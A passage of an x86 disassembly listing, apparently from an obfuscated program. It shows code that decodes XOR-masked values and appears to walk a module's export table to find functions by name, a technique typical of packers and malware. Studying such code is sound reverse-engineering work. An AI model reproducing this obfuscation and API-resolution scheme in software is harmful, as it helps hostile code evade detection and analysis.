  42142a:	push   edi
  42142b:	call   0x416c20
  421430:	mov    esi,DWORD PTR [ebp-0x218]
  421436:	cmp    esi,eax
  421438:	jne    0x4214ee
  42143e:	mov    eax,DWORD PTR [ebp-0x154]
  421444:	mov    edx,DWORD PTR [ebp-0x150]
  42144a:	xor    eax,0xca79a575
  42144f:	xor    edx,0x9c1b89e8
  421455:	mov    cl,0x2
  421457:	call   0x40a9b5
  42145c:	mov    esi,eax
  42145e:	mov    edi,edx
  421460:	mov    eax,DWORD PTR [ebp-0x154]
  421466:	mov    edx,DWORD PTR [ebp-0x150]
  42146c:	xor    eax,0xca79a575
  421471:	xor    edx,0x9c1b89e8
  421477:	mov    cl,0x3e
  421479:	call   0x42227f
  42147e:	or     esi,eax
  421480:	or     edi,edx
  421482:	mov    eax,DWORD PTR [ebp-0x15c]
  421488:	mov    edx,DWORD PTR [ebp-0x158]
  42148e:	xor    eax,0xca79a575
  421493:	xor    edx,0x9c1b89e8
  421499:	mov    cl,0x2
  42149b:	call   0x40a9b5
  4214a0:	mov    ebx,eax
  4214a2:	mov    eax,edx
  4214a4:	mov    ecx,DWORD PTR [ebp-0x15c]
  4214aa:	mov    edx,DWORD PTR [ebp-0x158]
  4214b0:	xor    ecx,0xca79a575
  4214b6:	xor    edx,0x9c1b89e8
  4214bc:	mov    DWORD PTR [ebp-0x224],eax
  4214c2:	mov    eax,ecx
  4214c4:	mov    cl,0x3e
  4214c6:	call   0x42227f
  4214cb:	or     ebx,eax
  4214cd:	mov    eax,DWORD PTR [ebp-0x224]
  4214d3:	or     eax,edx
  4214d5:	push   eax
  4214d6:	push   ebx
  4214d7:	push   edi
  4214d8:	push   esi
  4214d9:	call   0x416c20
  4214de:	mov    DWORD PTR [ebp-0x178],eax
  4214e4:	jmp    0x4217ae
  4214e9:	jmp    0x421764
  4214ee:	lea    eax,[ebp-0x168]
  4214f4:	mov    DWORD PTR [ebp-0x164],eax
  4214fa:	mov    eax,DWORD PTR [ebp-0x164]
  421500:	mov    DWORD PTR [eax],0xa4069aae
  421506:	mov    eax,DWORD PTR [ebp-0x168]
  42150c:	xor    eax,0xa4069aae
  421511:	shr    eax,0x2
  421514:	mov    ecx,DWORD PTR [ebp-0x168]
  42151a:	xor    ecx,0xa4069aae
  421520:	shl    ecx,0x1e
  421523:	or     eax,ecx
  421525:	mov    ecx,DWORD PTR [ebp-0x174]
  42152b:	mov    eax,DWORD PTR [ecx+eax*8+0x78]
  42152f:	mov    DWORD PTR [ebp-0x160],eax
  421535:	mov    esi,DWORD PTR [ebp-0x160]
  42153b:	mov    eax,DWORD PTR [ebp-0x154]
  421541:	mov    edx,DWORD PTR [ebp-0x150]
  421547:	xor    eax,0xca79a575
  42154c:	xor    edx,0x9c1b89e8
  421552:	mov    cl,0x2
  421554:	call   0x40a9b5
  421559:	mov    edi,eax
  42155b:	mov    ebx,edx
  42155d:	mov    eax,DWORD PTR [ebp-0x154]
  421563:	mov    edx,DWORD PTR [ebp-0x150]
  421569:	xor    eax,0xca79a575
  42156e:	xor    edx,0x9c1b89e8
  421574:	mov    cl,0x3e
  421576:	call   0x42227f
  42157b:	or     edi,eax
  42157d:	or     ebx,edx
  42157f:	mov    eax,DWORD PTR [ebp-0x15c]
  421585:	mov    edx,DWORD PTR [ebp-0x158]
  42158b:	xor    eax,0xca79a575
  421590:	xor    edx,0x9c1b89e8
  421596:	mov    cl,0x2
  421598:	call   0x40a9b5
  42159d:	mov    ecx,edx
  42159f:	mov    edx,DWORD PTR [ebp-0x15c]
  4215a5:	mov    DWORD PTR [ebp-0x228],esi
  4215ab:	mov    esi,DWORD PTR [ebp-0x158]
  4215b1:	xor    edx,0xca79a575
  4215b7:	xor    esi,0x9c1b89e8
  4215bd:	mov    DWORD PTR [ebp-0x22c],eax
  4215c3:	mov    eax,edx
  4215c5:	mov    edx,esi
  4215c7:	mov    DWORD PTR [ebp-0x230],ecx
  4215cd:	mov    cl,0x3e
  4215cf:	call   0x42227f
  4215d4:	mov    esi,DWORD PTR [ebp-0x22c]
  4215da:	or     esi,eax
  4215dc:	mov    eax,DWORD PTR [ebp-0x230]
  4215e2:	or     eax,edx
  4215e4:	push   eax
  4215e5:	push   esi
  4215e6:	push   ebx
  4215e7:	push   edi
  4215e8:	call   0x416c20
  4215ed:	mov    esi,DWORD PTR [ebp-0x228]
  4215f3:	cmp    esi,eax
  4215f5:	je     0x42166a
  4215fb:	mov    eax,DWORD PTR [ebp-0x154]
  421601:	mov    edx,DWORD PTR [ebp-0x150]
  421607:	xor    eax,0xca79a575
  42160c:	xor    edx,0x9c1b89e8
  421612:	mov    cl,0x2
  421614:	call   0x40a9b5
  421619:	mov    esi,eax
  42161b:	mov    edi,edx
  42161d:	mov    eax,DWORD PTR [ebp-0x154]
  421623:	mov    edx,DWORD PTR [ebp-0x150]
  421629:	xor    eax,0xca79a575
  42162e:	xor    edx,0x9c1b89e8
  421634:	mov    cl,0x3e
  421636:	call   0x42227f
  42163b:	or     esi,eax
  42163d:	or     edi,edx
  42163f:	mov    eax,DWORD PTR [ebp-0x160]
  421645:	imul   esi,eax
  421648:	add    esi,DWORD PTR [ebp-0x170]
  42164e:	mov    DWORD PTR [ebp-0x16c],esi
  421654:	mov    eax,DWORD PTR [ebp-0x16c]
  42165a:	mov    DWORD PTR [ebp-0x178],eax
  421660:	jmp    0x4217ae
  421665:	jmp    0x421715
  42166a:	mov    eax,DWORD PTR [ebp-0x154]
  421670:	mov    edx,DWORD PTR [ebp-0x150]
  421676:	xor    eax,0xca79a575
  42167b:	xor    edx,0x9c1b89e8
  421681:	mov    cl,0x2
  421683:	call   0x40a9b5
  421688:	mov    esi,eax
  42168a:	mov    edi,edx
  42168c:	mov    eax,DWORD PTR [ebp-0x154]
  421692:	mov    edx,DWORD PTR [ebp-0x150]
  421698:	xor    eax,0xca79a575
  42169d:	xor    edx,0x9c1b89e8
  4216a3:	mov    cl,0x3e
  4216a5:	call   0x42227f
  4216aa:	or     esi,eax
  4216ac:	or     edi,edx
  4216ae:	mov    eax,DWORD PTR [ebp-0x15c]
  4216b4:	mov    edx,DWORD PTR [ebp-0x158]
  4216ba:	xor    eax,0xca79a575
  4216bf:	xor    edx,0x9c1b89e8
  4216c5:	mov    cl,0x2
  4216c7:	call   0x40a9b5
  4216cc:	mov    ebx,eax
  4216ce:	mov    eax,edx
  4216d0:	mov    ecx,DWORD PTR [ebp-0x15c]
  4216d6:	mov    edx,DWORD PTR [ebp-0x158]
  4216dc:	xor    ecx,0xca79a575
  4216e2:	xor    edx,0x9c1b89e8
  4216e8:	mov    DWORD PTR [ebp-0x234],eax
  4216ee:	mov    eax,ecx
  4216f0:	mov    cl,0x3e
  4216f2:	call   0x42227f
  4216f7:	or     ebx,eax
  4216f9:	mov    eax,DWORD PTR [ebp-0x234]
  4216ff:	or     eax,edx
  421701:	push   eax
  421702:	push   ebx
  421703:	push   edi
  421704:	push   esi
  421705:	call   0x416c20
  42170a:	mov    DWORD PTR [ebp-0x178],eax
  421710:	jmp    0x4217ae
  421715:	mov    eax,DWORD PTR [ebp-0x15c]
  42171b:	mov    edx,DWORD PTR [ebp-0x158]
  421721:	xor    eax,0xca79a575
  421726:	xor    edx,0x9c1b89e8
  42172c:	mov    cl,0x2
  42172e:	call   0x40a9b5
  421733:	mov    esi,eax
  421735:	mov    edi,edx
  421737:	mov    eax,DWORD PTR [ebp-0x15c]
  42173d:	mov    edx,DWORD PTR [ebp-0x158]
  421743:	xor    eax,0xca79a575
  421748:	xor    edx,0x9c1b89e8
  42174e:	mov    cl,0x3e
  421750:	call   0x42227f
  421755:	or     esi,eax
  421757:	or     edi,edx
  421759:	mov    DWORD PTR [ebp-0x178],esi
  42175f:	jmp    0x4217ae
  421764:	mov    eax,DWORD PTR [ebp-0x15c]
  42176a:	mov    edx,DWORD PTR [ebp-0x158]
  421770:	xor    eax,0xca79a575
  421775:	xor    edx,0x9c1b89e8
  42177b:	mov    cl,0x2
  42177d:	call   0x40a9b5
  421782:	mov    esi,eax
  421784:	mov    edi,edx
  421786:	mov    eax,DWORD PTR [ebp-0x15c]
  42178c:	mov    edx,DWORD PTR [ebp-0x158]
  421792:	xor    eax,0xca79a575
  421797:	xor    edx,0x9c1b89e8
  42179d:	mov    cl,0x3e
  42179f:	call   0x42227f
  4217a4:	or     esi,eax
  4217a6:	or     edi,edx
  4217a8:	mov    DWORD PTR [ebp-0x178],esi
  4217ae:	mov    ecx,DWORD PTR [ebp-0xd8]
  4217b4:	mov    eax,0x459a
  4217b9:	xor    edx,edx
  4217bb:	div    ecx
  4217bd:	mov    ecx,DWORD PTR [ebp-0xdc]
  4217c3:	and    eax,ecx
  4217c5:	add    eax,DWORD PTR [ebp-0x44]
  4217c8:	mov    ecx,DWORD PTR [ebp-0xe0]
  4217ce:	lea    eax,[eax+ecx*1+0x272f]
  4217d5:	xor    eax,0x1080c
  4217da:	add    eax,DWORD PTR [ebp-0x178]
  4217e0:	mov    DWORD PTR [ebp-0xe8],eax
  4217e6:	mov    DWORD PTR [ebp-0xc],0x5950
  4217ed:	mov    DWORD PTR [ebp-0xf8],0x4964
  4217f7:	mov    DWORD PTR [ebp-0x130],0x3
  421801:	mov    DWORD PTR [ebp-0x20],0x2df9
  421808:	mov    DWORD PTR [ebp-0x8],0x4524
  42180f:	mov    DWORD PTR [ebp-0xd4],0x637e
  421819:	mov    DWORD PTR [ebp-0x110],0x38c8
  421823:	mov    DWORD PTR [ebp-0xa4],0x7118
  42182d:	mov    DWORD PTR [ebp-0xa0],0xaf6
  421837:	mov    DWORD PTR [ebp-0x10c],0x3315
  421841:	mov    eax,DWORD PTR [ebp-0xf8]
  421847:	mov    ecx,DWORD PTR [ebp-0x130]
  42184d:	xor    edx,edx
  42184f:	div    ecx
  421851:	add    eax,0x454e
  421856:	mov    ecx,DWORD PTR [ebp-0xc]
  421859:	and    eax,ecx
  42185b:	xor    eax,0x5940
  421860:	add    eax,DWORD PTR [ebp+0x8]
  421863:	mov    ecx,DWORD PTR [ebp-0x110]
  421869:	mov    edx,DWORD PTR [ebp-0xa4]
  42186f:	sub    ecx,edx
  421871:	mov    edx,DWORD PTR [ebp-0xd4]
  421877:	or     ecx,edx
  421879:	mov    edx,DWORD PTR [ebp-0x8]
  42187c:	and    ecx,edx
  42187e:	mov    edx,DWORD PTR [ebp-0x20]
  421881:	xor    ecx,edx
  421883:	mov    edx,DWORD PTR [ebp-0x10c]
  421889:	mov    esi,0x180f
  42188e:	sub    esi,edx
  421890:	mov    edx,DWORD PTR [ebp-0xa0]
  421896:	imul   esi,edx
  421899:	xor    esi,0x402b
  42189f:	xor    esi,0xfed78c17
  4218a5:	mov    edx,DWORD PTR [ebp-0xe8]
  4218ab:	mov    ecx,DWORD PTR [edx+ecx*1-0x68bd]
  4218b2:	add    ecx,eax
  4218b4:	add    esi,ecx
  4218b6:	mov    DWORD PTR [ebp-0x38],esi
  4218b9:	mov    DWORD PTR [ebp-0x4],0x59a8
  4218c0:	mov    DWORD PTR [ebp-0x30],0x7021
  4218c7:	mov    DWORD PTR [ebp-0xf4],0x6210
  4218d1:	mov    DWORD PTR [ebp-0x58],0x73d5
  4218d8:	mov    DWORD PTR [ebp-0x124],0x1e7d
  4218e2:	mov    DWORD PTR [ebp-0x3c],0x3144
  4218e9:	mov    eax,DWORD PTR [ebp-0x30]
  4218ec:	xor    eax,0x75cb
  4218f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4218f4:	imul   eax,ecx
  4218f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4218fa:	lea    ecx,[ecx+eax*1-0x2123b90]
  421901:	mov    eax,DWORD PTR [ebp-0xf4]
  421907:	and    eax,0x6b34
  42190c:	and    eax,0x658d
  421911:	xor    edx,edx
  421913:	push   0x6
  421915:	pop    esi
  421916:	div    esi
  421918:	imul   eax,eax,0x3fb9
  42191e:	mov    edx,DWORD PTR [ebp-0x3c]
  421921:	and    edx,0x58c7
  421927:	mov    esi,DWORD PTR [ebp-0x124]
  42192d:	or     edx,esi
  42192f:	add    edx,0x7a25
  421935:	imul   edx,edx,0x28d2
  42193b:	mov    esi,DWORD PTR [ebp-0x58]
  42193e:	xor    edx,esi
  421940:	xor    edx,0x1856f731
  421946:	mov    esi,DWORD PTR [ebp-0xe8]
  42194c:	mov    eax,DWORD PTR [esi+eax*1-0x3fb8fdc]
  421953:	add    eax,ecx
  421955:	add    edx,eax
  421957:	mov    DWORD PTR [ebp-0xac],edx
  42195d:	mov    DWORD PTR [ebp-0x54],0x1
  421964:	mov    DWORD PTR [ebp-0x40],0x1ee8
  42196b:	mov    DWORD PTR [ebp-0x1c],0x64d8
  421972:	mov    DWORD PTR [ebp-0xf0],0x5a06
  42197c:	mov    DWORD PTR [ebp-0x108],0x2eeb
  421986:	mov    DWORD PTR [ebp-0x104],0x2108
  421990:	mov    eax,DWORD PTR [ebp-0x1c]
  421993:	xor    edx,edx
  421995:	push   0x3
  421997:	pop    ecx
  421998:	div    ecx
  42199a:	mov    ecx,DWORD PTR [ebp-0x40]
  42199d:	or     eax,ecx
  42199f:	mov    ecx,DWORD PTR [ebp-0x54]
  4219a2:	xor    edx,edx
  4219a4:	div    ecx
  4219a6:	imul   eax,eax,0x7d53
  4219ac:	mov    ecx,DWORD PTR [ebp+0x8]
  4219af:	lea    eax,[ecx+eax*1-0x1f534807]
  4219b6:	mov    ecx,DWORD PTR [ebp-0xf0]
  4219bc:	and    ecx,0x4108
  4219c2:	and    ecx,0x40e7
  4219c8:	sub    ecx,0x1a54
  4219ce:	xor    ecx,0x25ac
  4219d4:	mov    edx,DWORD PTR [ebp-0x104]
  4219da:	xor    edx,0x6dda
  4219e0:	mov    esi,DWORD PTR [ebp-0x108]
  4219e6:	and    edx,esi
  4219e8:	and    edx,0xe0c
  4219ee:	or     edx,0x5b
  4219f1:	mov    esi,DWORD PTR [ebp-0xe8]
  4219f7:	mov    ecx,DWORD PTR [esi+ecx*1+0x1c]
  4219fb:	add    ecx,eax
  4219fd:	lea    eax,[edx+ecx*1-0xc5b]
  421a04:	mov    DWORD PTR [ebp-0xa8],eax
  421a0a:	and    DWORD PTR [ebp-0x144],0x0
  421a11:	jmp    0x421a23
  421a16:	mov    eax,DWORD PTR [ebp-0x144]
  421a1c:	inc    eax
  421a1d:	mov    DWORD PTR [ebp-0x144],eax
  421a23:	mov    eax,DWORD PTR [ebp-0xe8]
  421a29:	mov    ecx,DWORD PTR [ebp-0x144]
  421a2f:	cmp    ecx,DWORD PTR [eax+0x18]
  421a32:	je     0x421feb
  421a38:	mov    eax,DWORD PTR [ebp-0x144]
  421a3e:	mov    ecx,DWORD PTR [ebp-0x38]
  421a41:	mov    edx,DWORD PTR [ebp+0x8]
  421a44:	add    edx,DWORD PTR [ecx+eax*4]
  421a47:	mov    DWORD PTR [ebp-0x48],edx
  421a4a:	mov    eax,DWORD PTR [ebp-0x48]
  421a4d:	mov    DWORD PTR [ebp-0x210],eax
  421a53:	mov    eax,DWORD PTR [ebp+0xc]
  421a56:	mov    DWORD PTR [ebp-0x20c],eax
  421a5c:	mov    DWORD PTR [ebp-0x1f0],0xca79a575
  421a66:	mov    DWORD PTR [ebp-0x1ec],0x9c1b89e8
  421a70:	mov    DWORD PTR [ebp-0x1e0],0xca79a571
  421a7a:	mov    DWORD PTR [ebp-0x1dc],0x9c1b89e8
  421a84:	lea    eax,[ebp-0x1e8]
  421a8a:	mov    DWORD PTR [ebp-0x1f4],eax
  421a90:	mov    eax,DWORD PTR [ebp-0x20c]
  421a96:	movzx  eax,WORD PTR [eax+0x20]
  421a9a:	xor    eax,0xa49b
  421a9f:	movzx  eax,ax
  421aa2:	sar    eax,1
  421aa4:	mov    ecx,DWORD PTR [ebp-0x20c]
  421aaa:	movzx  ecx,WORD PTR [ecx+0x20]
  421aae:	xor    ecx,0xa49b
  421ab4:	movzx  ecx,cx
  421ab7:	shl    ecx,0xf
  421aba:	or     eax,ecx
  421abc:	movzx  eax,ax
  421abf:	mov    ecx,DWORD PTR [ebp-0x1f4]
  421ac5:	mov    DWORD PTR [ecx],eax
  421ac7:	mov    eax,DWORD PTR [ebp-0x1e0]
  421acd:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ad3:	xor    eax,0xca79a575
  421ad8:	xor    edx,0x9c1b89e8
  421ade:	mov    cl,0x2
  421ae0:	call   0x40a9b5
  421ae5:	mov    ebx,eax
  421ae7:	mov    esi,edx
  421ae9:	mov    eax,DWORD PTR [ebp-0x1e0]
  421aef:	mov    edx,DWORD PTR [ebp-0x1dc]
  421af5:	xor    eax,0xca79a575
  421afa:	xor    edx,0x9c1b89e8
  421b00:	mov    cl,0x3e
  421b02:	call   0x42227f
  421b07:	or     ebx,eax
  421b09:	or     esi,edx
  421b0b:	movzx  eax,bl
  421b0e:	push   eax
  421b0f:	lea    eax,[ebp-0x198]
  421b15:	push   eax
  421b16:	call   0x416c9e
  421b1b:	mov    eax,DWORD PTR [ebp-0x1f0]
  421b21:	mov    edx,DWORD PTR [ebp-0x1ec]
  421b27:	xor    eax,0xca79a575
  421b2c:	xor    edx,0x9c1b89e8
  421b32:	mov    cl,0x2
  421b34:	call   0x40a9b5
  421b39:	mov    esi,eax
  421b3b:	mov    edi,edx
  421b3d:	mov    eax,DWORD PTR [ebp-0x1f0]
  421b43:	mov    edx,DWORD PTR [ebp-0x1ec]
  421b49:	xor    eax,0xca79a575
  421b4e:	xor    edx,0x9c1b89e8
  421b54:	mov    cl,0x3e
  421b56:	call   0x42227f
  421b5b:	or     esi,eax
  421b5d:	or     edi,edx
  421b5f:	mov    DWORD PTR [ebp-0x1f8],esi
  421b65:	jmp    0x421bba
  421b6a:	mov    eax,DWORD PTR [ebp-0x1e0]
  421b70:	mov    edx,DWORD PTR [ebp-0x1dc]
  421b76:	xor    eax,0xca79a575
  421b7b:	xor    edx,0x9c1b89e8
  421b81:	mov    cl,0x2
  421b83:	call   0x40a9b5
  421b88:	mov    esi,eax
  421b8a:	mov    edi,edx
  421b8c:	mov    eax,DWORD PTR [ebp-0x1e0]
  421b92:	mov    edx,DWORD PTR [ebp-0x1dc]
  421b98:	xor    eax,0xca79a575
  421b9d:	xor    edx,0x9c1b89e8
  421ba3:	mov    cl,0x3e
  421ba5:	call   0x42227f
  421baa:	or     esi,eax
  421bac:	or     edi,edx
  421bae:	add    esi,DWORD PTR [ebp-0x1f8]
  421bb4:	mov    DWORD PTR [ebp-0x1f8],esi
  421bba:	mov    eax,DWORD PTR [ebp-0x1e8]
  421bc0:	cmp    DWORD PTR [ebp-0x1f8],eax
  421bc6:	je     0x421c59
  421bcc:	mov    eax,DWORD PTR [ebp-0x1f8]
  421bd2:	mov    ecx,DWORD PTR [ebp-0x20c]
  421bd8:	movzx  eax,WORD PTR [ecx+eax*4+0x2]
  421bdd:	xor    eax,0xa49b
  421be2:	movzx  eax,ax
  421be5:	sar    eax,1
  421be7:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421bed:	mov    edx,DWORD PTR [ebp-0x20c]
  421bf3:	movzx  ecx,WORD PTR [edx+ecx*4+0x2]
  421bf8:	xor    ecx,0xa49b
  421bfe:	movzx  ecx,cx
  421c01:	shl    ecx,0xf
  421c04:	or     eax,ecx
  421c06:	movzx  eax,ax
  421c09:	mov    DWORD PTR [ebp-0x1fc],eax
  421c0f:	mov    eax,DWORD PTR [ebp-0x1f8]
  421c15:	mov    ecx,DWORD PTR [ebp-0x20c]
  421c1b:	movzx  eax,WORD PTR [ecx+eax*4]
  421c1f:	xor    eax,0xa49b
  421c24:	movzx  eax,ax
  421c27:	sar    eax,1
  421c29:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421c2f:	mov    edx,DWORD PTR [ebp-0x20c]
  421c35:	movzx  ecx,WORD PTR [edx+ecx*4]
  421c39:	xor    ecx,0xa49b
  421c3f:	movzx  ecx,cx
  421c42:	shl    ecx,0xf
  421c45:	or     eax,ecx
  421c47:	mov    ecx,DWORD PTR [ebp-0x1fc]
  421c4d:	mov    BYTE PTR [ebp+ecx*1-0x198],al
  421c54:	jmp    0x421b6a
  421c59:	mov    eax,DWORD PTR [ebp-0x1f0]
  421c5f:	mov    edx,DWORD PTR [ebp-0x1ec]
  421c65:	xor    eax,0xca79a575
  421c6a:	xor    edx,0x9c1b89e8
  421c70:	mov    cl,0x2
  421c72:	call   0x40a9b5
  421c77:	mov    esi,eax
  421c79:	mov    edi,edx
  421c7b:	mov    eax,DWORD PTR [ebp-0x1f0]
  421c81:	mov    edx,DWORD PTR [ebp-0x1ec]
  421c87:	xor    eax,0xca79a575
  421c8c:	xor    edx,0x9c1b89e8
  421c92:	mov    cl,0x3e
  421c94:	call   0x42227f
  421c99:	or     esi,eax
  421c9b:	or     edi,edx
  421c9d:	mov    DWORD PTR [ebp-0x1e4],esi
  421ca3:	mov    eax,DWORD PTR [ebp-0x1e0]
  421ca9:	mov    edx,DWORD PTR [ebp-0x1dc]
  421caf:	xor    eax,0xca79a575
  421cb4:	xor    edx,0x9c1b89e8
  421cba:	mov    cl,0x2
  421cbc:	call   0x40a9b5
  421cc1:	mov    esi,eax
  421cc3:	mov    edi,edx
  421cc5:	mov    eax,DWORD PTR [ebp-0x1e0]
  421ccb:	mov    edx,DWORD PTR [ebp-0x1dc]
  421cd1:	xor    eax,0xca79a575
  421cd6:	xor    edx,0x9c1b89e8
  421cdc:	mov    cl,0x3e
  421cde:	call   0x42227f
  421ce3:	or     esi,eax
  421ce5:	or     edi,edx
  421ce7:	mov    DWORD PTR [ebp-0x23c],esi
  421ced:	mov    DWORD PTR [ebp-0x238],edi
  421cf3:	mov    eax,DWORD PTR [ebp-0x23c]
  421cf9:	or     eax,DWORD PTR [ebp-0x238]
  421cff:	je     0x421f5f
  421d05:	lea    eax,[ebp-0x204]
  421d0b:	mov    DWORD PTR [ebp-0x208],eax
  421d11:	mov    eax,DWORD PTR [ebp-0x1e4]
  421d17:	xor    edx,edx
  421d19:	mov    cl,0x2
  421d1b:	call   0x42227f
  421d20:	mov    esi,eax
  421d22:	mov    edi,edx
  421d24:	mov    eax,DWORD PTR [ebp-0x1e4]
  421d2a:	xor    edx,edx
  421d2c:	mov    cl,0x3e
  421d2e:	call   0x40a9b5
  421d33:	or     esi,eax
  421d35:	or     edi,edx
  421d37:	xor    esi,0xca79a575
  421d3d:	xor    edi,0x9c1b89e8
  421d43:	mov    eax,DWORD PTR [ebp-0x208]
  421d49:	mov    DWORD PTR [eax],esi
  421d4b:	mov    DWORD PTR [eax+0x4],edi
  421d4e:	mov    eax,DWORD PTR [ebp-0x1e4]
  421d54:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421d5c:	mov    eax,DWORD PTR [ebp-0x1e0]
  421d62:	mov    edx,DWORD PTR [ebp-0x1dc]
  421d68:	xor    eax,0xca79a575
  421d6d:	xor    edx,0x9c1b89e8
  421d73:	mov    cl,0x2
  421d75:	call   0x40a9b5
  421d7a:	mov    ebx,eax
  421d7c:	mov    edi,edx
  421d7e:	mov    eax,DWORD PTR [ebp-0x1e0]
  421d84:	mov    edx,DWORD PTR [ebp-0x1dc]
  421d8a:	xor    eax,0xca79a575
  421d8f:	xor    edx,0x9c1b89e8
  421d95:	mov    cl,0x3e
  421d97:	call   0x42227f
  421d9c:	or     ebx,eax
  421d9e:	or     edi,edx
  421da0:	movsx  eax,bl
  421da3:	cmp    esi,eax
  421da5:	je     0x421f05
  421dab:	mov    eax,DWORD PTR [ebp-0x1e4]
  421db1:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421db9:	mov    eax,DWORD PTR [ebp-0x204]
  421dbf:	mov    edx,DWORD PTR [ebp-0x200]
  421dc5:	xor    eax,0xca79a575
  421dca:	xor    edx,0x9c1b89e8
  421dd0:	mov    cl,0x2
  421dd2:	call   0x40a9b5
  421dd7:	mov    edi,eax
  421dd9:	mov    ebx,edx
  421ddb:	mov    eax,DWORD PTR [ebp-0x204]
  421de1:	mov    edx,DWORD PTR [ebp-0x200]
  421de7:	xor    eax,0xca79a575
  421dec:	xor    edx,0x9c1b89e8
  421df2:	mov    cl,0x3e
  421df4:	call   0x42227f
  421df9:	or     edi,eax
  421dfb:	or     ebx,edx
  421dfd:	mov    eax,DWORD PTR [ebp-0x210]
  421e03:	movsx  eax,BYTE PTR [eax+edi*1]
  421e07:	cmp    esi,eax
  421e09:	je     0x421e19
  421e0f:	jmp    0x421f5f
  421e14:	jmp    0x421f05
  421e19:	mov    eax,DWORD PTR [ebp-0x204]
  421e1f:	mov    edx,DWORD PTR [ebp-0x200]
  421e25:	xor    eax,0xca79a575
  421e2a:	xor    edx,0x9c1b89e8
  421e30:	mov    cl,0x2
  421e32:	call   0x40a9b5
  421e37:	mov    esi,eax
  421e39:	mov    edi,edx
  421e3b:	mov    eax,DWORD PTR [ebp-0x204]
  421e41:	mov    edx,DWORD PTR [ebp-0x200]
  421e47:	xor    eax,0xca79a575
  421e4c:	xor    edx,0x9c1b89e8
  421e52:	mov    cl,0x3e
  421e54:	call   0x42227f
  421e59:	or     esi,eax
  421e5b:	or     edi,edx
  421e5d:	mov    eax,DWORD PTR [ebp-0x210]
  421e63:	movsx  esi,BYTE PTR [eax+esi*1]
  421e67:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e6d:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e73:	xor    eax,0xca79a575
  421e78:	xor    edx,0x9c1b89e8
  421e7e:	mov    cl,0x2
  421e80:	call   0x40a9b5
  421e85:	mov    ebx,eax
  421e87:	mov    edi,edx
  421e89:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e8f:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e95:	xor    eax,0xca79a575
  421e9a:	xor    edx,0x9c1b89e8
  421ea0:	mov    cl,0x3e
  421ea2:	call   0x42227f
  421ea7:	or     ebx,eax
  421ea9:	or     edi,edx
  421eab:	movsx  eax,bl
  421eae:	cmp    esi,eax
  421eb0:	jne    0x421f05
  421eb6:	mov    eax,DWORD PTR [ebp-0x1e0]
  421ebc:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ec2:	xor    eax,0xca79a575
  421ec7:	xor    edx,0x9c1b89e8
  421ecd:	mov    cl,0x2
  421ecf:	call   0x40a9b5
  421ed4:	mov    esi,eax
  421ed6:	mov    edi,edx
  421ed8:	mov    eax,DWORD PTR [ebp-0x1e0]
  421ede:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ee4:	xor    eax,0xca79a575
  421ee9:	xor    edx,0x9c1b89e8
  421eef:	mov    cl,0x3e
  421ef1:	call   0x42227f
  421ef6:	or     esi,eax
  421ef8:	or     edi,edx
  421efa:	mov    DWORD PTR [ebp-0x214],esi
  421f00:	jmp    0x421fa9
  421f05:	mov    eax,DWORD PTR [ebp-0x1e0]
  421f0b:	mov    edx,DWORD PTR [ebp-0x1dc]
  421f11:	xor    eax,0xca79a575
  421f16:	xor    edx,0x9c1b89e8
  421f1c:	mov    cl,0x2
  421f1e:	call   0x40a9b5
  421f23:	mov    esi,eax
  421f25:	mov    edi,edx
  421f27:	mov    eax,DWORD PTR [ebp-0x1e0]
  421f2d:	mov    edx,DWORD PTR [ebp-0x1dc]
  421f33:	xor    eax,0xca79a575
  421f38:	xor    edx,0x9c1b89e8
  421f3e:	mov    cl,0x3e
  421f40:	call   0x42227f
  421f45:	or     esi,eax
  421f47:	or     edi,edx
  421f49:	add    esi,DWORD PTR [ebp-0x1e4]
  421f4f:	mov    DWORD PTR [ebp-0x1e4],esi
  421f55:	jmp    0x421ca3
  421f5a:	jmp    0x421ca3
  421f5f:	mov    eax,DWORD PTR [ebp-0x1f0]
  421f65:	mov    edx,DWORD PTR [ebp-0x1ec]
  421f6b:	xor    eax,0xca79a575
  421f70:	xor    edx,0x9c1b89e8
  421f76:	mov    cl,0x2
  421f78:	call   0x40a9b5
  421f7d:	mov    esi,eax
  421f7f:	mov    edi,edx
  421f81:	mov    eax,DWORD PTR [ebp-0x1f0]
  421f87:	mov    edx,DWORD PTR [ebp-0x1ec]
  421f8d:	xor    eax,0xca79a575
  421f92:	xor    edx,0x9c1b89e8
  421f98:	mov    cl,0x3e
  421f9a:	call   0x42227f
  421f9f:	or     esi,eax
  421fa1:	or     edi,edx
  421fa3:	mov    DWORD PTR [ebp-0x214],esi
  421fa9:	mov    eax,DWORD PTR [ebp-0x214]
  421faf:	mov    DWORD PTR [ebp-0xc8],eax
  421fb5:	cmp    DWORD PTR [ebp-0xc8],0x0
  421fbc:	je     0x421fe6
  421fc2:	mov    eax,DWORD PTR [ebp-0x144]
  421fc8:	mov    ecx,DWORD PTR [ebp-0xac]
  421fce:	movzx  eax,WORD PTR [ecx+eax*2]
  421fd2:	mov    ecx,DWORD PTR [ebp-0xa8]
  421fd8:	mov    eax,DWORD PTR [ecx+eax*4]
  421fdb:	mov    DWORD PTR [ebp-0xfc],eax
  421fe1:	jmp    0x421feb
  421fe6:	jmp    0x421a16
  421feb:	cmp    DWORD PTR [ebp-0xfc],0x0
  421ff2:	jne    0x421fff
  421ff8:	xor    eax,eax
  421ffa:	jmp    0x422278
  421fff:	mov    eax,DWORD PTR [ebp+0x8]
  422002:	add    eax,DWORD PTR [ebp-0xfc]
  422008:	mov    DWORD PTR [ebp-0xec],eax
  42200e:	mov    DWORD PTR [ebp-0x74],0x0
  422015:	cmp    DWORD PTR [ebp-0xb0],0x0
  42201c:	je     0x422098
  422022:	cmp    DWORD PTR [ebp-0xb0],0x0
  422029:	je     0x422098
  42202f:	mov    eax,DWORD PTR [ebp-0xb0]
  422035:	shl    eax,0x2
  422038:	mov    DWORD PTR [ebp-0x74],eax
  42203b:	mov    DWORD PTR [ebp-0x14c],0x0
